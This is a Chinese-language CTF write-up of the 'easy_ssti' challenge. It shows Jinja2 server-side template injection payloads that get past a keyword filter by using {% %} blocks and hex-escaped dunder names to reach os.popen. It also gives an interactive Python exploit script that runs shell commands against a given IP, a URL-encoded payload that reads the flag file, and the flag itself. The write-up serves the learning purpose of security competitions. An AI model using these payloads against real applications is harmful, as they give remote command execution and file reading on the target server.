## Hard | easy_ssti | Author: CrzZ

和baby_ssti差不多，就是多过滤了点东西。

```python
['{{','}}','__',' ','url_for','request','config']
```

需要熟悉一下jinja2模板引擎，可以直接去官网阅读[document](https://jinja.palletsprojects.com/en/2.11.x/templates/)

熟悉完之后，发现虽然`{{code}}`被过滤了，但是我们还可以用`{%code%}`来绕过

`url_for`、`request`、`config`都被ban了，看过下面这篇东西的人应该能很容易想到用基本数据类型的继承关系来实现RCE，接下来就是绕过的问题了。

![image-20201129214631128.png](https://i.loli.net/2020/11/29/id8NfFo6OyLUqR5.png)

熟读了jinja2的document和上面的pdf之后，很容易就构造出了下面这条payload

```jinja2
{%for(x)in(()['\x5f\x5fclass\x5f\x5f']['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']())%}
{%if(x['\x5f\x5fname\x5f\x5f']=='Codec')%}
{%for(c)in(x.decode['\x5f\x5fglobals\x5f\x5f']['builtins']['\x5f\x5fimport\x5f\x5f']('os').popen('whoami').read().encode())%}
{%for(i)in(range(c))%}
@
{%endfor%}
$
{%endfor%}
{%endif%}
{%endfor%}
```

- `@`的数量来表示是哪个字符
- `$`用作分割符

然后写一下exp跑一跑，flag就出来了

```python
import requests
from urllib.parse import quote


url = "http://111.231.101.223:32769/"
while True:
    shell = input("shell>").encode() # 输入shell指令
    shell = ''.join(list(map(lambda x: '\\x' + hex(x)[2:], list(shell)))) # 十六进制编码绕过
    payload = f'''
    {{%for(x)in(()['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fbase\\x5f\\x5f']['\\x5f\\x5fsubclasses\\x5f\\x5f']())%}}
    {{%if(x['\\x5f\\x5fname\\x5f\\x5f']=='Codec')%}}
    {{%for(c)in(x.decode['\\x5f\\x5fglobals\\x5f\\x5f']['builtins']['\\x5f\\x5fimport\\x5f\\x5f']('os').popen('{shell}').read().encode())%}}
    {{%for(i)in(range(c))%}}
    @
    {{%endfor%}}
    $
    {{%endfor%}}
    {{%endif%}}
    {{%endfor%}}
    '''
    payload = quote(payload.replace(' ', '')) # 去除多余的空格并进行urlencode
    res = requests.get(url+payload)
    results = res.text.split('$') # 字符串分割
    for result in results:
        count = 0
        for c in result:
            if c == '@':
                count += 1 # 计数算出字符
        if count == 0:
            continue
        print(chr(count), end='')
    print()
```

但是，因为过滤得不严格，可以用`{%print()%}`，所以我们可以直接一条payload把flag打印出来

```jinja2
{%-for(x)in(()['\x5f\x5fclass\x5f\x5f']['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']())-%}
{%-if(x['\x5f\x5fname\x5f\x5f']=='Codec')-%}
{%-print(x.decode['\x5f\x5fglobals\x5f\x5f']['builtins']['open']('flag').read())-%}
{%-endif-%}
{%-endfor-%}
```

urlencode之后就是

```
%7B%25-for(x)in(()%5B'%5Cx5f%5Cx5fclass%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fclass%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fbase%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fsubclasses%5Cx5f%5Cx5f'%5D())-%25%7D%0A%7B%25-if(x%5B'%5Cx5f%5Cx5fname%5Cx5f%5Cx5f'%5D%3D%3D'Codec')-%25%7D%0A%7B%25-print(x.decode%5B'%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f'%5D%5B'builtins'%5D%5B'open'%5D('flag').read())-%25%7D%0A%7B%25-endif-%25%7D%0A%7B%25-endfor-%25%7D
```

所以最终的url就是：

```
http://111.231.101.223:32769/%7B%25-for(x)in(()%5B'%5Cx5f%5Cx5fclass%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fclass%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fbase%5Cx5f%5Cx5f'%5D%5B'%5Cx5f%5Cx5fsubclasses%5Cx5f%5Cx5f'%5D())-%25%7D%0A%7B%25-if(x%5B'%5Cx5f%5Cx5fname%5Cx5f%5Cx5f'%5D%3D%3D'Codec')-%25%7D%0A%7B%25-print(x.decode%5B'%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f'%5D%5B'builtins'%5D%5B'open'%5D('flag').read())-%25%7D%0A%7B%25-endif-%25%7D%0A%7B%25-endfor-%25%7D
```

> `Kap0k{Y0u_4r3_600d_4t_P7th0n~}`

所以说这题熟悉了jinja2之后是真的简单（x